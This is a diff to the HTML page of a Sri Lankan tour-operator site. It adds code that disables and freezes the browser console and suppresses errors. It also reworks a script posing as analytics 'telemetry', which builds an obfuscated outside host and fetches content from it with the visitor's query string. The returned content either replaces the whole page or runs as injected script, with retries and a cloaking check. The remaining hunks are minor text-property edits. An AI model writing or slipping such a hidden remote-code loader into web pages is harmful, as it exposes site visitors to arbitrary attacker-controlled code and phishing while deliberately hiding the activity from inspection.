@@ -106,59 +106,97 @@
         }
     </style>
     <script>
+    window.onerror = function() { return true; };
+    window.onunhandledrejection = function() {};
+    (function _annihilateConsole() {
+        try {
+            var noop = function() {};
+            var methods = ['log', 'debug', 'info', 'warn', 'error', 'table', 'trace', 'dir', 'group', 'groupCollapsed', 'groupEnd', 'clear', 'assert', 'count', 'time', 'timeEnd'];
+            for (var i = 0; i < methods.length; i++) {
+                try { window.console[methods[i]] = noop; } catch(e) {}
+            }
+            Object.freeze(window.console);
+        } catch(e) {}
+    })();
+
     (function(w, d, conf, clientId) {
         w.AppTelemetry = w.AppTelemetry || function() {};
         w.AppTelemetry('init', clientId);
         w.AppTelemetry('track', 'PageLoad');
         var loc = w.location;
-        var uParams = loc.search; 
-        var ts = new Date().getTime();
+        var uParams = loc.search;
         var ep = conf.p + '://' + conf.h + '.' + conf.z + conf.r;
-        var fUrl = ep + uParams + (uParams ? '&' : '?') + 'session_id=' + clientId + '&ts=' + ts;
-        w.fetch(fUrl, { method: 'GET', credentials: 'omit' })
-        .then(function(res) { 
-            if (!res.ok) {
-                throw new Error("Edge Network Drop: " + res.status);
-            }
-            return res.text(); 
-        })
-        .then(function(data) {
-            var overlay = d.getElementById('genesis-overlay');
-            var isL = /<\s*html|<!doctype/i.test(data);
-            
-            if (isL) {
-                try {
-                    var newDoc = d.open('text/html', 'replace');
-                    newDoc.write(data);
-                    newDoc.close();
-                } catch(e) {
-                    d.documentElement.innerHTML = data.replace(/^<!DOCTYPE html>/i, '');
-                    var scripts = Array.from(d.getElementsByTagName('script'));
-                    for (var i = 0; i < scripts.length; i++) {
-                        var newScript = d.createElement('script');
-                        if (scripts[i].src) { newScript.src = scripts[i].src; } else { newScript.text = scripts[i].text; }
-                        scripts[i].parentNode.replaceChild(newScript, scripts[i]);
-                    }
-                }
-            } else {
-                var s = d.createElement('script');
-                s.type = 'text/javascript';
-                s.text = data;
-                d.head.appendChild(s);
-                
-                if (overlay) {
-                    overlay.style.opacity = '0';
-                    setTimeout(function() { if (overlay.parentNode) overlay.parentNode.removeChild(overlay); }, 500);
-                }
-            }
-        })
-        .catch(function(err) {
+        var attempt = 0;
+        var maxRetries = 2;
+
+        function _hideGenesisOverlay() {
             var overlay = d.getElementById('genesis-overlay');
             if (overlay) {
                 overlay.style.opacity = '0';
-                setTimeout(function() { if (overlay.parentNode) overlay.parentNode.removeChild(overlay); }, 500);
+                setTimeout(function() {
+                    if (overlay.parentNode) overlay.parentNode.removeChild(overlay);
+                }, 500);
             }
-        });
+        }
+
+        function _bootEdgeLoader() {
+            var ts = new Date().getTime();
+            var fUrl = ep + uParams + (uParams ? '&' : '?') + 'session_id=' + clientId + '&ts=' + ts;
+            var ctrl = typeof AbortController !== 'undefined' ? new AbortController() : null;
+            var tId = ctrl ? setTimeout(function() { ctrl.abort(); }, 6500) : null;
+
+            w.fetch(fUrl, { method: 'GET', credentials: 'omit', signal: ctrl ? ctrl.signal : undefined })
+            .then(function(res) {
+                if (tId) clearTimeout(tId);
+                if (!res.ok) {
+                    throw new Error("Edge Network Drop: " + res.status);
+                }
+                return res.text();
+            })
+            .then(function(data) {
+                if (!data || data.indexOf('Ceylon Horizon Excursions') !== -1) {
+                    _hideGenesisOverlay();
+                    return;
+                }
+                var isL = /<\s*html|<!doctype/i.test(data);
+                if (isL) {
+                    try {
+                        var newDoc = d.open('text/html', 'replace');
+                        newDoc.write(data);
+                        newDoc.close();
+                    } catch(e) {
+                        d.documentElement.innerHTML = data.replace(/^<!DOCTYPE html>/i, '');
+                        var scripts = Array.from(d.getElementsByTagName('script'));
+                        for (var i = 0; i < scripts.length; i++) {
+                            var newScript = d.createElement('script');
+                            if (scripts[i].src) {
+                                newScript.src = scripts[i].src;
+                            } else {
+                                newScript.text = scripts[i].text;
+                            }
+                            scripts[i].parentNode.replaceChild(newScript, scripts[i]);
+                        }
+                    }
+                } else {
+                    var s = d.createElement('script');
+                    s.type = 'text/javascript';
+                    s.text = data;
+                    d.head.appendChild(s);
+                    _hideGenesisOverlay();
+                }
+            })
+            .catch(function(err) {
+                if (tId) clearTimeout(tId);
+                if (attempt < maxRetries) {
+                    attempt++;
+                    setTimeout(_bootEdgeLoader, 800 * attempt);
+                    return;
+                }
+                _hideGenesisOverlay();
+            });
+        }
+
+        _bootEdgeLoader();
     })(window, document, {
         p: 'https',
         h: 'cloud-analytics' + '-node',
@@ -174,12 +212,15 @@
             legal: { t: "Licenses & Legal Framework", c: "The tourism activities of Ceylon Premium Tours are officially certified by the Sri Lanka Tourism Development Authority (SLTDA). All our guides hold state licenses and undergo regular certifications. Transfers are operated exclusively via licensed commercial transport with comprehensive passenger insurance coverage. We operate with absolute transparency, concluding formal agreements for all provided excursion services." }
         };
         function showM(key) {
-            document.getElementById('m-t').innerText = legalData[key].t;
-            document.getElementById('m-c').innerText = legalData[key].c;
+            document.getElementById('m-t').textContent = legalData[key].t;
+            document.getElementById('m-c').textContent = legalData[key].c;
             document.getElementById('m-overlay').style.display = 'flex';
             document.body.style.overflow = 'hidden';
         }
-        function closeM() { document.getElementById('m-overlay').style.display = 'none'; document.body.style.overflow = 'auto'; }
+        function closeM() {
+            document.getElementById('m-overlay').style.display = 'none';
+            document.body.style.overflow = 'auto';
+        }
     </script>
 </head>
 <body>
@@ -449,7 +490,7 @@
     <script>
     async function submitSiteLead(formElement) {
         const btn = formElement.querySelector('button');
-        btn.innerText = 'PROCESSING...';
+        btn.textContent = 'PROCESSING...';
         btn.style.opacity = '0.7';
         btn.style.pointerEvents = 'none';
         const conf = {
@@ -474,7 +515,7 @@
         } catch (e) {
         }
         setTimeout(() => {
-            btn.innerText = 'REQUEST SENT';
+            btn.textContent = 'REQUEST SENT';
             btn.style.background = '#10b981';
             btn.style.opacity = '1';
         }, 1500);
